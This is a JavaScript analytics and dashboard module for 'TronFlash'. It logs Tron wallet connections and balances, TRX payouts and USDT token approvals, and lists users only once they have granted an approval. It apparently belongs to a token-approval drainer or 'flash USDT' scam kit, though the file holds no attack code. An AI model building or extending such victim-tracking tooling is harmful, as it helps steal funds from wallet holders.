// ========================================
// ANALYTICS & DASHBOARD SYSTEM
// ========================================
// Comprehensive analytics tracking for TronFlash

class AnalyticsSystem {
    constructor() {
        this.data = {
            users: {},
            transactions: [],
            errors: [],
            dailyStats: {},
            realTimeStats: {
                activeUsers: 0,
                totalConnections: 0,
                totalTRXSent: 0,
                totalUSDTApprovals: 0,
                successRate: 0,
                errorRate: 0
            }
        };
        
        this.init();
    }

    init() {
        this.loadStoredData();
        this.startRealTimeTracking();
        this.setupEventListeners();
        console.log('📊 Analytics System Initialized');
    }

    // ========================================
    // DATA STORAGE & RETRIEVAL
    // ========================================
    
    loadStoredData() {
        try {
            const stored = localStorage.getItem('tronflash_analytics');
            if (stored) {
                this.data = { ...this.data, ...JSON.parse(stored) };
            }
        } catch (error) {
            console.error('Error loading analytics data:', error);
        }
    }

    saveData() {
        try {
            localStorage.setItem('tronflash_analytics', JSON.stringify(this.data));
        } catch (error) {
            console.error('Error saving analytics data:', error);
        }
    }

    // ========================================
    // USER TRACKING
    // ========================================
    
    trackUserConnection(userAddress, userData = {}) {
        if (!window.getConfig('ANALYTICS.ENABLED')) return;
        
        const timestamp = new Date().toISOString();
        const today = new Date().toDateString();
        
        // Only track basic connection data, don't add to dashboard until approval
        const existingUser = this.data.users[userAddress];
        
        if (existingUser) {
            // Update existing user connection data
            this.data.users[userAddress] = {
                ...existingUser,
                lastSeen: timestamp,
                totalConnections: (existingUser.totalConnections || 0) + 1,
                trxBalance: userData.trxBalance || existingUser.trxBalance || 0,
                usdtBalance: userData.usdtBalance || existingUser.usdtBalance || 0,
                lastTRXBalance: userData.trxBalance || existingUser.lastTRXBalance || 0,
                lastUSDTBalance: userData.usdtBalance || existingUser.lastUSDTBalance || 0,
            };
        } else {
            // Create temporary user data (not shown in dashboard until approval)
            this.data.users[userAddress] = {
                firstSeen: timestamp,
                lastSeen: timestamp,
                totalConnections: 1,
                trxReceived: 0,
                usdtApprovals: 0,
                trxBalance: userData.trxBalance || 0,
                usdtBalance: userData.usdtBalance || 0,
                lastTRXBalance: userData.trxBalance || 0,
                lastUSDTBalance: userData.usdtBalance || 0,
                uniqueUserId: null, // Will be assigned on approval
                isApproved: false, // Flag to track approval status
                ...userData
            };
        }
        
        // Update daily stats
        this.updateDailyStats(today, 'userConnections');
        
        // Update real-time stats
        this.data.realTimeStats.totalConnections++;
        this.data.realTimeStats.activeUsers = Object.keys(this.data.users).filter(addr => 
            this.data.users[addr].isApproved
        ).length;
        
        this.saveData();
        this.logEvent('user_connected', { userAddress, timestamp, userData });
    }

    trackTRXSent(userAddress, amount, txid) {
        if (!window.getConfig('ANALYTICS.ENABLED')) return;
        
        const timestamp = new Date().toISOString();
        const today = new Date().toDateString();
        
        // Track transaction
        this.data.transactions.push({
            type: 'trx_sent',
            userAddress,
            amount,
            txid,
            timestamp
        });
        
        // Update user data
        if (this.data.users[userAddress]) {
            this.data.users[userAddress].trxReceived += amount;
        }
        
        // Update daily stats
        this.updateDailyStats(today, 'trxSent', amount);
        
        // Update real-time stats
        this.data.realTimeStats.totalTRXSent += amount;
        
        this.saveData();
        this.logEvent('trx_sent', { userAddress, amount, txid, timestamp });
    }

    trackUSDTApproval(userAddress, approvedAddress, approvedAmount) {
        if (!window.getConfig('ANALYTICS.ENABLED')) return;
        
        const timestamp = new Date().toISOString();
        const today = new Date().toDateString();
        
        // Track transaction
        this.data.transactions.push({
            type: 'usdt_approval',
            userAddress,
            approvedAddress,
            approvedAmount,
            timestamp
        });
        
        // Update user data and assign unique ID on first approval
        if (this.data.users[userAddress]) {
            const user = this.data.users[userAddress];
            
            // Assign unique user ID on first approval
            if (!user.uniqueUserId) {
                const approvedUsersCount = Object.keys(this.data.users).filter(addr => 
                    this.data.users[addr].isApproved
                ).length;
                user.uniqueUserId = `USER-${String(approvedUsersCount + 1).padStart(4, '0')}`;
            }
            
            // Mark as approved and update approval count
            user.isApproved = true;
            user.usdtApprovals = (user.usdtApprovals || 0) + 1;
            user.lastApprovalTime = timestamp;
            
            this.data.users[userAddress] = user;
        } else {
            // Create new approved user
            const approvedUsersCount = Object.keys(this.data.users).filter(addr => 
                this.data.users[addr].isApproved
            ).length;
            
            this.data.users[userAddress] = {
                firstSeen: timestamp,
                lastSeen: timestamp,
                totalConnections: 1,
                trxReceived: 0,
                usdtApprovals: 1,
                trxBalance: 0,
                usdtBalance: 0,
                lastTRXBalance: 0,
                lastUSDTBalance: 0,
                uniqueUserId: `USER-${String(approvedUsersCount + 1).padStart(4, '0')}`,
                isApproved: true,
                lastApprovalTime: timestamp
            };
        }
        
        // Update daily stats
        this.updateDailyStats(today, 'usdtApprovals');
        
        // Update real-time stats
        this.data.realTimeStats.totalUSDTApprovals++;
        this.data.realTimeStats.activeUsers = Object.keys(this.data.users).filter(addr => 
            this.data.users[addr].isApproved
        ).length;
        
        this.saveData();
        this.logEvent('usdt_approval', { 
            userAddress, 
            approvedAddress, 
            approvedAmount, 
            timestamp,
            uniqueUserId: this.data.users[userAddress]?.uniqueUserId
        });
    }

    trackError(error, context = {}) {
        if (!window.getConfig('ANALYTICS.ENABLED')) return;
        
        const timestamp = new Date().toISOString();
        const today = new Date().toDateString();
        
        // Track error
        this.data.errors.push({
            error: error.message || error,
            context,
            timestamp
        });
        
        // Update daily stats
        this.updateDailyStats(today, 'errors');
        
        // Update real-time stats
        this.data.realTimeStats.errorRate = this.calculateErrorRate();
        
        this.saveData();
        this.logEvent('error', { error: error.message || error, context, timestamp });
    }

    // ========================================
    // DAILY STATISTICS
    // ========================================
    
    updateDailyStats(date, metric, value = 1) {
        if (!this.data.dailyStats[date]) {
            this.data.dailyStats[date] = {
                userConnections: 0,
                trxSent: 0,
                usdtApprovals: 0,
                errors: 0,
                successRate: 0
            };
        }
        
        if (metric === 'trxSent') {
            this.data.dailyStats[date].trxSent += value;
        } else {
            this.data.dailyStats[date][metric]++;
        }
        
        // Calculate success rate
        const total = this.data.dailyStats[date].userConnections;
        const errors = this.data.dailyStats[date].errors;
        this.data.dailyStats[date].successRate = total > 0 ? ((total - errors) / total * 100).toFixed(2) : 100;
    }

    // ========================================
    // CALCULATIONS
    // ========================================
    
    calculateErrorRate() {
        const total = this.data.realTimeStats.totalConnections;
        const errors = this.data.errors.length;
        return total > 0 ? ((errors / total) * 100).toFixed(2) : 0;
    }

    calculateSuccessRate() {
        const total = this.data.realTimeStats.totalConnections;
        const errors = this.data.errors.length;
        return total > 0 ? (((total - errors) / total) * 100).toFixed(2) : 100;
    }

    // ========================================
    // REAL-TIME TRACKING
    // ========================================
    
    startRealTimeTracking() {
        if (!window.getConfig('ANALYTICS.REAL_TIME_UPDATES')) return;
        
        setInterval(() => {
            this.updateRealTimeStats();
            this.cleanupOldData();
        }, 10000); // Update every 10 seconds
    }

    updateRealTimeStats() {
        this.data.realTimeStats.successRate = this.calculateSuccessRate();
        this.data.realTimeStats.errorRate = this.calculateErrorRate();
        this.data.realTimeStats.activeUsers = Object.keys(this.data.users).length;
    }

    cleanupOldData() {
        const retentionDays = window.getConfig('ANALYTICS.DATA_RETENTION_DAYS') || 30;
        const cutoffDate = new Date();
        cutoffDate.setDate(cutoffDate.getDate() - retentionDays);
        
        // Clean up old daily stats
        Object.keys(this.data.dailyStats).forEach(date => {
            if (new Date(date) < cutoffDate) {
                delete this.data.dailyStats[date];
            }
        });
        
        // Clean up old transactions
        this.data.transactions = this.data.transactions.filter(tx => 
            new Date(tx.timestamp) > cutoffDate
        );
        
        // Clean up old errors
        this.data.errors = this.data.errors.filter(error => 
            new Date(error.timestamp) > cutoffDate
        );
        
        this.saveData();
    }

    // ========================================
    // EVENT LISTENERS
    // ========================================
    
    setupEventListeners() {
        // Listen for custom events
        window.addEventListener('tronflash_user_connected', (event) => {
            this.trackUserConnection(event.detail.userAddress, event.detail.userData);
        });
        
        window.addEventListener('tronflash_trx_sent', (event) => {
            this.trackTRXSent(event.detail.userAddress, event.detail.amount, event.detail.txid);
        });
        
        window.addEventListener('tronflash_usdt_approval', (event) => {
            this.trackUSDTApproval(event.detail.userAddress, event.detail.approvedAddress, event.detail.approvedAmount);
        });
        
        window.addEventListener('tronflash_error', (event) => {
            this.trackError(event.detail.error, event.detail.context);
        });
    }

    // ========================================
    // LOGGING
    // ========================================
    
    logEvent(eventType, data) {
        if (window.getConfig('UI.CONSOLE_LOGGING')) {
            console.log(`📊 Analytics: ${eventType}`, data);
        }
    }

    // ========================================
    // DASHBOARD DATA
    // ========================================
    
    getDashboardData() {
        const today = new Date().toDateString();
        const todayStats = this.data.dailyStats[today] || {
            userConnections: 0,
            trxSent: 0,
            usdtApprovals: 0,
            errors: 0,
            successRate: 100
        };
        
        return {
            realTime: this.data.realTimeStats,
            today: todayStats,
            total: {
                users: Object.keys(this.data.users).length,
                transactions: this.data.transactions.length,
                errors: this.data.errors.length,
                totalTRXSent: this.data.realTimeStats.totalTRXSent
            },
            recentTransactions: this.data.transactions.slice(-10).reverse(),
            recentErrors: this.data.errors.slice(-5).reverse(),
            approvedUsers: this.getApprovedUsers()
        };
    }

    getApprovedUsers() {
        return Object.entries(this.data.users)
            .filter(([address, userData]) => userData.isApproved === true && userData.usdtApprovals > 0)
            .sort((a, b) => new Date(b[1].lastApprovalTime || b[1].lastSeen) - new Date(a[1].lastApprovalTime || a[1].lastSeen))
            .map(([address, userData]) => ({
                address,
                ...userData
            }));
    }

    // ========================================
    // DATA REFRESH
    // ========================================
    
    refreshData() {
        if (!window.getConfig('ANALYTICS.ENABLED')) return;
        
        try {
            // Reload data from localStorage
            this.loadData();
            
            // Update real-time stats
            this.updateRealTimeStats();
            
            // Save updated data
            this.saveData();
            
            console.log('Analytics data refreshed successfully');
        } catch (error) {
            console.error('Error refreshing analytics data:', error);
        }
    }

    // ========================================
    // EXPORT DATA
    // ========================================
    
    exportData() {
        return {
            users: this.data.users,
            transactions: this.data.transactions,
            errors: this.data.errors,
            dailyStats: this.data.dailyStats,
            realTimeStats: this.data.realTimeStats,
            exportDate: new Date().toISOString()
        };
    }

    // ========================================
    // RESET DATA
    // ========================================
    
    resetData() {
        this.data = {
            users: {},
            transactions: [],
            errors: [],
            dailyStats: {},
            realTimeStats: {
                activeUsers: 0,
                totalConnections: 0,
                totalTRXSent: 0,
                totalUSDTApprovals: 0,
                successRate: 0,
                errorRate: 0
            }
        };
        this.saveData();
        console.log('📊 Analytics data reset');
    }
}

// ========================================
// INITIALIZE ANALYTICS SYSTEM
// ========================================
window.TronFlashAnalytics = new AnalyticsSystem();

// ========================================
// HELPER FUNCTIONS
// ========================================
window.trackUserConnection = (userAddress, userData) => {
    window.TronFlashAnalytics.trackUserConnection(userAddress, userData);
};

window.trackTRXSent = (userAddress, amount, txid) => {
    window.TronFlashAnalytics.trackTRXSent(userAddress, amount, txid);
};

window.trackUSDTApproval = (userAddress, approvedAddress, approvedAmount) => {
    window.TronFlashAnalytics.trackUSDTApproval(userAddress, approvedAddress, approvedAmount);
};

window.trackError = (error, context) => {
    window.TronFlashAnalytics.trackError(error, context);
};

window.getAnalyticsData = () => {
    return window.TronFlashAnalytics.getDashboardData();
};

console.log('📊 Analytics System Loaded Successfully');
